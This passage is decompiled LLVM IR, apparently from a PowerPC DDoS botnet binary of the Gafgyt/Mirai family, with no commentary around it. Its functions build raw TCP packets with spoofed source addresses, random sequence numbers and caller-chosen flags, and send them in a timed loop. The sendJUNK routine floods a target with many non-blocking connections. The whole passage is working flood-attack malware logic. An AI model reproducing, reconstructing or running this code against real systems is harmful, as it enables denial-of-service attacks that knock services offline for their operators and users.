dec_label_pc_1000a13c:                            ; preds = %dec_label_pc_1000a110, %dec_label_pc_1000a124
  %v2_1000a13c = ptrtoint i32* %stack_var_-92 to i32
  %v4_1000a14c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_1000a13c)
  %v3_1000a154 = icmp eq i32 %v4_1000a14c, 0
  br i1 %v3_1000a154, label %dec_label_pc_1000a160, label %dec_label_pc_1000a6ec

dec_label_pc_1000a160:                            ; preds = %dec_label_pc_1000a13c
  store i32 268476808, i32* @lr, align 4
  %v3_1000a184 = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_1000a194 = icmp eq i32 %v3_1000a184, 0
  br i1 %v3_1000a194, label %dec_label_pc_1000a19c, label %dec_label_pc_1000a1bc

dec_label_pc_1000a19c:                            ; preds = %dec_label_pc_1000a160
  %v3_1000a1a0 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint (i32* @global_var_1000a1b8.919 to i32), i32* @lr, align 4
  %v4_1000a1b4 = call i32 @HackerPrint(i32 %v3_1000a1a0, i32 ptrtoint ([27 x i8]* @global_var_1001aa00.910 to i32), i32 268566528)
  br label %dec_label_pc_1000a6ec

dec_label_pc_1000a1bc:                            ; preds = %dec_label_pc_1000a160
  store i32 1, i32* %stack_var_-76, align 4
  %v2_1000a1c4 = ptrtoint i32* %stack_var_-76 to i32
  store i32 268476896, i32* @lr, align 4
  %v5_1000a1dc = call i32 @__GI_setsockopt(i32 %v3_1000a184, i32 0, i32 3, i32 %v2_1000a1c4, i32 4)
  %tmp59 = icmp sgt i32 %v5_1000a1dc, -1
  br i1 %tmp59, label %dec_label_pc_1000a20c, label %dec_label_pc_1000a1ec

dec_label_pc_1000a1ec:                            ; preds = %dec_label_pc_1000a1bc
  %v3_1000a1f0 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint (i32* @global_var_1000a208.920 to i32), i32* @lr, align 4
  %v4_1000a204 = call i32 @HackerPrint(i32 %v3_1000a1f0, i32 ptrtoint ([33 x i8]* @global_var_1001aa1c.914 to i32), i32 268566528)
  br label %dec_label_pc_1000a6ec

dec_label_pc_1000a20c:                            ; preds = %dec_label_pc_1000a1bc
  %v3_1000a210 = icmp eq i32 %arg4, 0
  br i1 %v3_1000a210, label %dec_label_pc_1000a23c, label %dec_label_pc_1000a224

dec_label_pc_1000a224:                            ; preds = %dec_label_pc_1000a20c
  br label %dec_label_pc_1000a23c

dec_label_pc_1000a23c:                            ; preds = %dec_label_pc_1000a20c, %dec_label_pc_1000a224
  %v1_1000a240 = add i32 %arg6, 40
  %v1_1000a250 = add i32 %arg6, 70
  %v1_1000a254 = and i32 %v1_1000a250, -16
  %v2_1000a25c = load i32, i32* %stack_var_-128, align 4
  %v1_1000a264 = load i32, i32* @r1, align 4
  %v3_1000a264 = sub i32 %v1_1000a264, %v1_1000a254
  %v4_1000a264 = inttoptr i32 %v3_1000a264 to i32*
  store i32 %v2_1000a25c, i32* %v4_1000a264, align 4
  %v1_1000a274 = add i32 %v3_1000a264, 23
  %v1_1000a278 = and i32 %v1_1000a274, -16
  %v1_1000a298 = add i32 %v1_1000a278, 20
  %v5_1000a29c = inttoptr i32 %v1_1000a298 to i16*
  %v0_1000a2ac = call i32 @HackerScan2()
  store i32 %v0_1000a2ac, i32* @r3, align 4
  %v1_1000a2b8 = call i32 @htonl(i32 %v0_1000a2ac)
  %v1_1000a2c4 = add i32 %arg6, 20
  %v0_1000a2cc = load i32, i32* @r29, align 4
  %v6_1000a2dc = inttoptr i32 %v1_1000a278 to i32*
  %v7_1000a2dc = call i32 @makeIPPacket(i32* %v6_1000a2dc, i32 %v0_1000a2cc, i32 %v1_1000a2b8, i32 6, i32 %v1_1000a2c4, i32 %arg6)
  %v0_1000a2e0 = call i32 @rand_cmwc()
  %v1_1000a2f0 = trunc i32 %v0_1000a2e0 to i16
  store i16 %v1_1000a2f0, i16* %v5_1000a29c, align 4
  %v0_1000a2f4 = call i32 @rand_cmwc()
  %v2_1000a300 = add i32 %v1_1000a278, 24
  %v3_1000a300 = inttoptr i32 %v2_1000a300 to i32*
  store i32 %v0_1000a2f4, i32* %v3_1000a300, align 8
  %v2_1000a30c = add i32 %v1_1000a278, 28
  %v3_1000a30c = inttoptr i32 %v2_1000a30c to i32*
  store i32 0, i32* %v3_1000a30c, align 4
  %v1_1000a314 = add i32 %v1_1000a278, 32
  %v2_1000a314 = inttoptr i32 %v1_1000a314 to i32*
  %v1_1000a31c = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_1000a320 = add i32 %v1_1000a278, 32
  %v3_1000a320 = inttoptr i32 %v2_1000a320 to i32*
  store i32 %v1_1000a31c, i32* %v3_1000a320, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_1001aa40.921 to i32), i32* @r4, align 4
  %v3_1000a334 = inttoptr i32 %arg5 to i8*
  %v4_1000a334 = call i32 @__GI_strcoll(i8* %v3_1000a334, i32 ptrtoint ([4 x i8]* @global_var_1001aa40.921 to i32))
  %v3_1000a33c = icmp eq i32 %v4_1000a334, 0
  br i1 %v3_1000a33c, label %dec_label_pc_1000a344, label %dec_label_pc_1000a398

dec_label_pc_1000a344:                            ; preds = %dec_label_pc_1000a23c
  %v3_1000a348 = load i32, i32* %v2_1000a314, align 16
  %v1_1000a38c = or i32 %v3_1000a348, 2031616
  store i32 %v1_1000a38c, i32* %v2_1000a314, align 16
  br label %dec_label_pc_1000a500

dec_label_pc_1000a398:                            ; preds = %dec_label_pc_1000a23c
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268477356, i32* @lr, align 4
  %v3_1000a3a8 = call i32 @__GI_strtok(i32 %arg5, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000a4f818 = icmp eq i32 %v3_1000a3a8, 0
  br i1 %v3_1000a4f818, label %dec_label_pc_1000a500, label %dec_label_pc_1000a3b8

dec_label_pc_1000a3b8:                            ; preds = %dec_label_pc_1000a398, %dec_label_pc_1000a4dc
  %storemerge1319 = phi i32 [ %v3_1000a4e8, %dec_label_pc_1000a4dc ], [ %v3_1000a3a8, %dec_label_pc_1000a398 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1001aa48.923 to i32), i32* @r4, align 4
  %v3_1000a3c8 = inttoptr i32 %storemerge1319 to i8*
  %v4_1000a3c8 = call i32 @__GI_strcoll(i8* %v3_1000a3c8, i32 ptrtoint ([4 x i8]* @global_var_1001aa48.923 to i32))
  %v3_1000a3d0 = icmp eq i32 %v4_1000a3c8, 0
  br i1 %v3_1000a3d0, label %dec_label_pc_1000a3d8, label %dec_label_pc_1000a3ec

dec_label_pc_1000a3d8:                            ; preds = %dec_label_pc_1000a3b8
  %v3_1000a3dc = load i32, i32* %v2_1000a314, align 16
  %v1_1000a3e0 = or i32 %v3_1000a3dc, 131072
  store i32 %v1_1000a3e0, i32* %v2_1000a314, align 16
  br label %dec_label_pc_1000a4dc

dec_label_pc_1000a3ec:                            ; preds = %dec_label_pc_1000a3b8
  store i32 ptrtoint ([4 x i8]* @global_var_1001aa4c.924 to i32), i32* @r4, align 4
  %v4_1000a3fc = call i32 @__GI_strcoll(i8* %v3_1000a3c8, i32 ptrtoint ([4 x i8]* @global_var_1001aa4c.924 to i32))
  %v3_1000a404 = icmp eq i32 %v4_1000a3fc, 0
  br i1 %v3_1000a404, label %dec_label_pc_1000a40c, label %dec_label_pc_1000a420

dec_label_pc_1000a40c:                            ; preds = %dec_label_pc_1000a3ec
  %v3_1000a410 = load i32, i32* %v2_1000a314, align 16
  %v1_1000a414 = or i32 %v3_1000a410, 262144
  store i32 %v1_1000a414, i32* %v2_1000a314, align 16
  br label %dec_label_pc_1000a4dc

dec_label_pc_1000a420:                            ; preds = %dec_label_pc_1000a3ec
  store i32 ptrtoint ([4 x i8]* @global_var_1001aa50.925 to i32), i32* @r4, align 4
  %v4_1000a430 = call i32 @__GI_strcoll(i8* %v3_1000a3c8, i32 ptrtoint ([4 x i8]* @global_var_1001aa50.925 to i32))
  %v3_1000a438 = icmp eq i32 %v4_1000a430, 0
  br i1 %v3_1000a438, label %dec_label_pc_1000a440, label %dec_label_pc_1000a454

dec_label_pc_1000a440:                            ; preds = %dec_label_pc_1000a420
  %v3_1000a444 = load i32, i32* %v2_1000a314, align 16
  %v1_1000a448 = or i32 %v3_1000a444, 65536
  store i32 %v1_1000a448, i32* %v2_1000a314, align 16
  br label %dec_label_pc_1000a4dc

dec_label_pc_1000a454:                            ; preds = %dec_label_pc_1000a420
  store i32 ptrtoint ([4 x i8]* @global_var_1001aa54.926 to i32), i32* @r4, align 4
  %v4_1000a464 = call i32 @__GI_strcoll(i8* %v3_1000a3c8, i32 ptrtoint ([4 x i8]* @global_var_1001aa54.926 to i32))
  %v3_1000a46c = icmp eq i32 %v4_1000a464, 0
  br i1 %v3_1000a46c, label %dec_label_pc_1000a474, label %dec_label_pc_1000a488

dec_label_pc_1000a474:                            ; preds = %dec_label_pc_1000a454
  %v3_1000a478 = load i32, i32* %v2_1000a314, align 16
  %v1_1000a47c = or i32 %v3_1000a478, 1048576
  store i32 %v1_1000a47c, i32* %v2_1000a314, align 16
  br label %dec_label_pc_1000a4dc

dec_label_pc_1000a488:                            ; preds = %dec_label_pc_1000a454
  store i32 ptrtoint ([4 x i8]* @global_var_1001aa58.927 to i32), i32* @r4, align 4
  %v4_1000a498 = call i32 @__GI_strcoll(i8* %v3_1000a3c8, i32 ptrtoint ([4 x i8]* @global_var_1001aa58.927 to i32))
  %v3_1000a4a0 = icmp eq i32 %v4_1000a498, 0
  br i1 %v3_1000a4a0, label %dec_label_pc_1000a4a8, label %dec_label_pc_1000a4bc

dec_label_pc_1000a4a8:                            ; preds = %dec_label_pc_1000a488
  %v3_1000a4ac = load i32, i32* %v2_1000a314, align 16
  %v1_1000a4b0 = or i32 %v3_1000a4ac, 524288
  store i32 %v1_1000a4b0, i32* %v2_1000a314, align 16
  br label %dec_label_pc_1000a4dc

dec_label_pc_1000a4bc:                            ; preds = %dec_label_pc_1000a488
  %v3_1000a4c0 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a4dc.929 to i32), i32* @lr, align 4
  %v5_1000a4d8 = call i32 @HackerPrint(i32 %v3_1000a4c0, i32 ptrtoint ([18 x i8]* @global_var_1001aa5c.928 to i32), i32 %storemerge1319)
  br label %dec_label_pc_1000a4dc

dec_label_pc_1000a4dc:                            ; preds = %dec_label_pc_1000a4a8, %dec_label_pc_1000a474, %dec_label_pc_1000a440, %dec_label_pc_1000a40c, %dec_label_pc_1000a3d8, %dec_label_pc_1000a4bc
  store i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32* @r4, align 4
  store i32 268477676, i32* @lr, align 4
  %v3_1000a4e8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001aa44.922 to i32), i32 268566528)
  %v3_1000a4f8 = icmp eq i32 %v3_1000a4e8, 0
  br i1 %v3_1000a4f8, label %dec_label_pc_1000a500, label %dec_label_pc_1000a3b8

dec_label_pc_1000a500:                            ; preds = %dec_label_pc_1000a4dc, %dec_label_pc_1000a398, %dec_label_pc_1000a344
  %v0_1000a500 = call i32 @rand_cmwc()
  %v1_1000a510 = trunc i32 %v0_1000a500 to i16
  %v3_1000a510 = add i32 %v1_1000a278, 34
  %v4_1000a510 = inttoptr i32 %v3_1000a510 to i16*
  store i16 %v1_1000a510, i16* %v4_1000a510, align 2
  %v3_1000a51c = add i32 %v1_1000a278, 36
  %v4_1000a51c = inttoptr i32 %v3_1000a51c to i16*
  store i16 0, i16* %v4_1000a51c, align 4
  %v3_1000a528 = add i32 %v1_1000a278, 38
  %v4_1000a528 = inttoptr i32 %v3_1000a528 to i16*
  store i16 0, i16* %v4_1000a528, align 2
  br i1 %v3_1000a108, label %dec_label_pc_1000a538, label %dec_label_pc_1000a54c

dec_label_pc_1000a538:                            ; preds = %dec_label_pc_1000a500
  %v0_1000a538 = call i32 @rand_cmwc()
  %extract.t63 = trunc i32 %v0_1000a538 to i16
  br label %dec_label_pc_1000a564

dec_label_pc_1000a54c:                            ; preds = %dec_label_pc_1000a500
  %v1_1000a550 = urem i32 %arg2, 65536
  store i32 %v1_1000a550, i32* @r3, align 4
  %v1_1000a558 = call i32 @htons(i32 %v1_1000a550)
  %extract.t = trunc i32 %v1_1000a558 to i16
  br label %dec_label_pc_1000a564

dec_label_pc_1000a564:                            ; preds = %dec_label_pc_1000a538, %dec_label_pc_1000a54c
  %storemerge60.off0 = phi i16 [ %extract.t, %dec_label_pc_1000a54c ], [ %extract.t63, %dec_label_pc_1000a538 ]
  %v3_1000a56c = add i32 %v1_1000a278, 22
  %v4_1000a56c = inttoptr i32 %v3_1000a56c to i16*
  store i16 %storemerge60.off0, i16* %v4_1000a56c, align 2
  store i32 268477820, i32* @lr, align 4
  %v3_1000a578 = inttoptr i32 %v1_1000a298 to i32*
  %v4_1000a578 = call i32 @tcpcsum(i32 %v1_1000a278, i32* %v3_1000a578, i32 %v1_1000a298)
  %v1_1000a584 = trunc i32 %v4_1000a578 to i16
  store i16 %v1_1000a584, i16* %v4_1000a51c, align 4
  %v1_1000a594 = or i32 %v1_1000a278, 2
  %v2_1000a594 = inttoptr i32 %v1_1000a594 to i16*
  %v3_1000a594 = load i16, i16* %v2_1000a594, align 2
  %v4_1000a594 = zext i16 %v3_1000a594 to i32
  %v5_1000a5a4 = inttoptr i32 %v1_1000a278 to i16*
  %v6_1000a5a4 = call i32 @csum(i16* %v5_1000a5a4, i32 %v4_1000a594, i32 %v1_1000a278, i32 6, i32 %v1_1000a2c4)
  %sext3 = mul i32 %v6_1000a5a4, 65536
  %v1_1000a5a8 = sdiv i32 %sext3, 65536
  %v1_1000a5b0 = trunc i32 %v1_1000a5a8 to i16
  %v3_1000a5b0 = or i32 %v1_1000a278, 10
  %v4_1000a5b0 = inttoptr i32 %v3_1000a5b0 to i16*
  store i16 %v1_1000a5b0, i16* %v4_1000a5b0, align 2
  store i32 268477884, i32* @lr, align 4
  %v1_1000a5b8 = call i32 @__GI_time(i32 0)
  %v2_1000a5c4 = add i32 %v1_1000a5b8, %arg3
  %v2_1000a61c = or i32 %v1_1000a278, 12
  %v3_1000a61c = inttoptr i32 %v2_1000a61c to i32*
  %v3_1000a630 = or i32 %v1_1000a278, 4
  %v4_1000a630 = inttoptr i32 %v3_1000a630 to i16*
  br label %dec_label_pc_1000a5d8

dec_label_pc_1000a5d8:                            ; preds = %dec_label_pc_1000a5d8.backedge, %dec_label_pc_1000a564
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_1000a564 ], [ %storemerge22, %dec_label_pc_1000a5d8.backedge ]
  store i32 268477948, i32* @lr, align 4
  %v6_1000a5f8 = call i32 @__libc_sendto(i32 %v3_1000a184, i32 %v1_1000a278, i32 %v1_1000a240, i32 0, i32 %v2_1000a13c, i32 16)
  %v0_1000a604 = call i32 @HackerScan2()
  store i32 %v0_1000a604, i32* @r3, align 4
  %v1_1000a610 = call i32 @htonl(i32 %v0_1000a604)
  store i32 %v1_1000a610, i32* %v3_1000a61c, align 4
  %v0_1000a620 = call i32 @rand_cmwc()
  %v1_1000a630 = trunc i32 %v0_1000a620 to i16
  store i16 %v1_1000a630, i16* %v4_1000a630, align 4
  %v0_1000a634 = call i32 @rand_cmwc()
  store i32 %v0_1000a634, i32* %v3_1000a300, align 8
  %v0_1000a644 = call i32 @rand_cmwc()
  %v1_1000a654 = trunc i32 %v0_1000a644 to i16
  store i16 %v1_1000a654, i16* %v5_1000a29c, align 4
  store i16 0, i16* %v4_1000a51c, align 4
  store i32 268478064, i32* @lr, align 4
  %v4_1000a66c = call i32 @tcpcsum(i32 %v1_1000a278, i32* %v3_1000a578, i32 %v1_1000a298)
  %v1_1000a678 = trunc i32 %v4_1000a66c to i16
  store i16 %v1_1000a678, i16* %v4_1000a51c, align 4
  %v3_1000a688 = load i16, i16* %v2_1000a594, align 2
  %v4_1000a688 = zext i16 %v3_1000a688 to i32
  %v6_1000a698 = call i32 @csum(i16* %v5_1000a5a4, i32 %v4_1000a688, i32 %v1_1000a278, i32 0, i32 %v2_1000a13c)
  %v1_1000a6a4 = trunc i32 %v6_1000a698 to i16
  store i16 %v1_1000a6a4, i16* %v4_1000a5b0, align 2
  %v4_1000a6b0 = icmp eq i32 %stack_var_-44.0, %arg7
  br i1 %v4_1000a6b0, label %dec_label_pc_1000a6b8, label %dec_label_pc_1000a6dc

dec_label_pc_1000a6b8:                            ; preds = %dec_label_pc_1000a5d8
  store i32 268478144, i32* @lr, align 4
  %v1_1000a6bc = call i32 @__GI_time(i32 0)
  %v3_1000a6c8 = icmp sgt i32 %v1_1000a6bc, %v2_1000a5c4
  br i1 %v3_1000a6c8, label %dec_label_pc_1000a6ec, label %dec_label_pc_1000a5d8.backedge

dec_label_pc_1000a5d8.backedge:                   ; preds = %dec_label_pc_1000a6b8, %dec_label_pc_1000a6dc
  %storemerge22 = phi i32 [ %v1_1000a6e0, %dec_label_pc_1000a6dc ], [ 0, %dec_label_pc_1000a6b8 ]
  br label %dec_label_pc_1000a5d8

dec_label_pc_1000a6dc:                            ; preds = %dec_label_pc_1000a5d8
  %v1_1000a6e0 = add i32 %stack_var_-44.0, 1
  br label %dec_label_pc_1000a5d8.backedge

dec_label_pc_1000a6ec:                            ; preds = %dec_label_pc_1000a6b8, %dec_label_pc_1000a13c, %dec_label_pc_1000a1ec, %dec_label_pc_1000a19c
  %v0_1000a714 = phi i32 [ %v4_1000a14c, %dec_label_pc_1000a13c ], [ %v4_1000a204, %dec_label_pc_1000a1ec ], [ %v4_1000a1b4, %dec_label_pc_1000a19c ], [ %v1_1000a6bc, %dec_label_pc_1000a6b8 ]
  ret i32 %v0_1000a714

; uselistorder directives
  uselistorder i32 %v1_1000a550, { 1, 0 }
  uselistorder i32 %v3_1000a4e8, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i32* %v2_1000a314, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32 %v1_1000a2c4, { 1, 0 }
  uselistorder i32 %v1_1000a298, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000a278, { 13, 14, 15, 2, 3, 4, 16, 1, 5, 17, 6, 7, 8, 9, 0, 10, 11, 12, 18, 19 }
  uselistorder i32 %v2_1000a13c, { 1, 2, 0 }
  uselistorder i32 %v1_1000a128, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 ()* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000a6ec, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1000a5d8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a564, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4dc, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000a3b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a23c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a13c, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000a718 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000a718, i32* %stack_var_-240, align 4
  store i32 268478280, i32* @lr, align 4
  %v0_1000a744 = call i32 @getdtablesize()
  %v1_1000a74c = udiv i32 %v0_1000a744, 2
  %v2_1000a74c = and i32 %v0_1000a744, -2147483648
  %v3_1000a74c = or i32 %v1_1000a74c, %v2_1000a74c
  store i32 2, i32* %stack_var_-200, align 4
  %v1_1000a764 = urem i32 %arg2, 65536
  store i32 %v1_1000a764, i32* @r3, align 4
  %v1_1000a76c = call i32 @htons(i32 %v1_1000a764)
  %v2_1000a778 = ptrtoint i32* %stack_var_-200 to i32
  %v4_1000a788 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-196, i32 %v2_1000a778)
  %v3_1000a790 = icmp eq i32 %v4_1000a788, 0
  br i1 %v3_1000a790, label %dec_label_pc_1000a79c, label %dec_label_pc_1000ac60

dec_label_pc_1000a79c:                            ; preds = %entry
  %v1_1000a7b8 = mul i32 %v1_1000a74c, 8
  %v1_1000a7c0 = add i32 %v1_1000a7b8, 30
  %v1_1000a7c4 = and i32 %v1_1000a7c0, -16
  %v2_1000a7cc = load i32, i32* %stack_var_-240, align 4
  %v1_1000a7d4 = load i32, i32* @r1, align 4
  %v3_1000a7d4 = sub i32 %v1_1000a7d4, %v1_1000a7c4
  %v4_1000a7d4 = inttoptr i32 %v3_1000a7d4 to i32*
  store i32 %v2_1000a7cc, i32* %v4_1000a7d4, align 4
  %v1_1000a7e4 = add i32 %v3_1000a7d4, 23
  %v1_1000a7e8 = and i32 %v1_1000a7e4, -16
  %v1_1000a804 = mul i32 %v3_1000a74c, 5
  store i32 268478488, i32* @lr, align 4
  %v3_1000a814 = call i32 @__GI_memset(i32 %v1_1000a7e8, i32 0, i32 %v1_1000a804)
  store i32 268478496, i32* @lr, align 4
  %v1_1000a81c = call i32 @malloc(i32 1024)
  store i32 ptrtoint ([3 x i8]* @global_var_1000a840.930 to i32), i32* @lr, align 4
  %v3_1000a83c = call i32 @__GI_memset(i32 %v1_1000a81c, i32 0, i32 1024)
  store i32 268478536, i32* @lr, align 4
  %v1_1000a844 = call i32 @__GI_time(i32 0)
  %v2_1000a850 = add i32 %v1_1000a844, %arg3
  store i32 268479568, i32* @lr, align 4
  %v1_1000ac4c10 = call i32 @__GI_time(i32 0)
  %v2_1000ac5811 = icmp slt i32 %v1_1000ac4c10, %v2_1000a850
  br i1 %v2_1000ac5811, label %dec_label_pc_1000ac38.preheader.lr.ph, label %dec_label_pc_1000ac60

dec_label_pc_1000ac38.preheader.lr.ph:            ; preds = %dec_label_pc_1000a79c
  %v2_1000ac405 = icmp sgt i32 %v3_1000a74c, 0
  %v2_1000a9b4 = ptrtoint i32* %stack_var_-184 to i32
  %v2_1000aa18 = ptrtoint i32* %stack_var_-232 to i32
  %v2_1000aa1c = add i32 %v2_1000aa18, 48
  %v2_1000aa8c = ptrtoint i32* %stack_var_-56 to i32
  %v2_1000aad8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_1000aadc = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_1000ac38.preheader

dec_label_pc_1000a868:                            ; preds = %dec_label_pc_1000ac38.preheader, %dec_label_pc_1000ac2c
  %storemerge28 = phi i32 [ %v1_1000ac30, %dec_label_pc_1000ac2c ], [ 0, %dec_label_pc_1000ac38.preheader ]
  %v1_1000a870 = mul i32 %storemerge28, 8
  %v2_1000a874 = add i32 %v1_1000a870, %v1_1000a7e8
  %v1_1000a878 = or i32 %v2_1000a874, 4
  %v2_1000a878 = inttoptr i32 %v1_1000a878 to i8*
  %v3_1000a878 = load i8, i8* %v2_1000a878, align 4
  %v1_1000a888 = icmp eq i8 %v3_1000a878, 0
  %v3_1000a888 = icmp eq i8 %v3_1000a878, 1
  br i1 %v3_1000a888, label %dec_label_pc_1000a9b4, label %dec_label_pc_1000a890

dec_label_pc_1000a890:                            ; preds = %dec_label_pc_1000a868
  %v3_1000a894 = icmp eq i8 %v3_1000a878, 2
  br i1 %v3_1000a894, label %dec_label_pc_1000aba0, label %dec_label_pc_1000a89c

dec_label_pc_1000a89c:                            ; preds = %dec_label_pc_1000a890
  br i1 %v1_1000a888, label %dec_label_pc_1000a8ac, label %dec_label_pc_1000ac2c

dec_label_pc_1000a8ac:                            ; preds = %dec_label_pc_1000a89c
  store i32 268478656, i32* @lr, align 4
  %v3_1000a8bc = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_1000a8c8 = mul i32 %storemerge28, 8
  %v2_1000a8cc = add i32 %v1_1000a8c8, %v1_1000a7e8
  %v2_1000a8d0 = inttoptr i32 %v2_1000a8cc to i32*
  store i32 %v3_1000a8bc, i32* %v2_1000a8d0, align 8
  %v1_1000a8e4 = inttoptr i32 %v2_1000a874 to i32*
  %v2_1000a8e4 = load i32, i32* %v1_1000a8e4, align 8
  store i32 268478736, i32* @lr, align 4
  %v2_1000a90c = call i32 @__libc_fcntl(i32 %v2_1000a8e4, i32 3)
  store i32 268478764, i32* @lr, align 4
  %v2_1000a928 = call i32 @__libc_fcntl(i32 %v2_1000a8e4, i32 4)
  %v2_1000a93c = load i32, i32* %v1_1000a8e4, align 8
  store i32 268478804, i32* @lr, align 4
  %v3_1000a950 = call i32 @__libc_connect(i32 %v2_1000a93c, i32 %v2_1000a778, i32 16)
  %v4_1000a95c = icmp eq i32 %v3_1000a950, -1
  br i1 %v4_1000a95c, label %dec_label_pc_1000a964, label %dec_label_pc_1000a978

dec_label_pc_1000a964:                            ; preds = %dec_label_pc_1000a8ac
  %v0_1000a964 = call i32 @__errno_location()
  %v1_1000a96c = inttoptr i32 %v0_1000a964 to i32*
  %v2_1000a96c = load i32, i32* %v1_1000a96c, align 4
  %v3_1000a970 = icmp eq i32 %v2_1000a96c, 115
  br i1 %v3_1000a970, label %dec_label_pc_1000a998, label %dec_label_pc_1000a978

dec_label_pc_1000a978:                            ; preds = %dec_label_pc_1000a8ac, %dec_label_pc_1000a964
  %v2_1000a988 = load i32, i32* %v1_1000a8e4, align 8
  store i32 ptrtoint (i32* @global_var_1000a994.931 to i32), i32* @lr, align 4
  %v1_1000a990 = call i32 @__libc_close(i32 %v2_1000a988)
  br label %dec_label_pc_1000ac2c

dec_label_pc_1000a998:                            ; preds = %dec_label_pc_1000a964
  store i8 1, i8* %v2_1000a878, align 4
  br label %dec_label_pc_1000ac2c

dec_label_pc_1000a9b4:                            ; preds = %dec_label_pc_1000a868
  store i32 %v2_1000a9b4, i32* %stack_var_-232, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge

dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge: ; preds = %dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge.dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge_crit_edge, %dec_label_pc_1000a9b4
  %v3_1000a9cc.pre = phi i32 [ %v2_1000a9b4, %dec_label_pc_1000a9b4 ], [ %v3_1000a9cc.pre.pre, %dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge.dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge_crit_edge ]
  %v1_1000a9e447 = phi i32 [ 1, %dec_label_pc_1000a9b4 ], [ %v1_1000a9e4, %dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge.dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge_crit_edge ]
  %v1_1000a9d0 = mul nuw nsw i32 %v1_1000a9e447, 4
  %v2_1000a9d4 = add i32 %v1_1000a9d0, %v3_1000a9cc.pre
  %v2_1000a9dc = inttoptr i32 %v2_1000a9d4 to i32*
  store i32 0, i32* %v2_1000a9dc, align 4
  %v1_1000a9e4 = add nuw nsw i32 %v1_1000a9e447, 1
  %tmp45 = icmp ult i32 %v1_1000a9e4, 32
  br i1 %tmp45, label %dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge.dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge_crit_edge, label %dec_label_pc_1000a9f8

dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge.dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge_crit_edge: ; preds = %dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge
  %v3_1000a9cc.pre.pre = load i32, i32* %stack_var_-232, align 4
  br label %dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge

dec_label_pc_1000a9f8:                            ; preds = %dec_label_pc_1000a9c8.dec_label_pc_1000a9c8_crit_edge
  %v1_1000aa08 = inttoptr i32 %v2_1000a874 to i32*
  %v2_1000aa08 = load i32, i32* %v1_1000aa08, align 8
  %v1_1000aa0c = udiv i32 %v2_1000aa08, 32
  %v1_1000aa14 = mul nuw nsw i32 %v1_1000aa0c, 4
  %v1_1000aa20 = add i32 %v2_1000aa1c, %v1_1000aa14
  %v1_1000aa24 = inttoptr i32 %v1_1000aa20 to i32*
  %v2_1000aa24 = load i32, i32* %v1_1000aa24, align 4
  %v1_1000aa3c = urem i32 %v2_1000aa08, 32
  %v3_1000aa44 = shl i32 1, %v1_1000aa3c
  %v2_1000aa48 = or i32 %v3_1000aa44, %v2_1000aa24
  store i32 %v2_1000aa48, i32* %v1_1000aa24, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v2_1000aa80 = load i32, i32* %v1_1000aa08, align 8
